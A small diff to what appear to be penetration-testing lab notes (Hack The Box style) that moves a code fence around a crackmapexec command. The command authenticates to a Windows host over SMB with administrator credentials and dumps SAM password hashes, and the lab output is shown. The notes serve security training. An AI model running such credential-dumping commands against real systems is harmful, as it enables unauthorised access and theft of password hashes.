@@ -305,9 +305,9 @@ SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon
 
 #### Extract Hashes from SAM Database
 
+```bash
 d41y@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 
-```bash
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
 SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
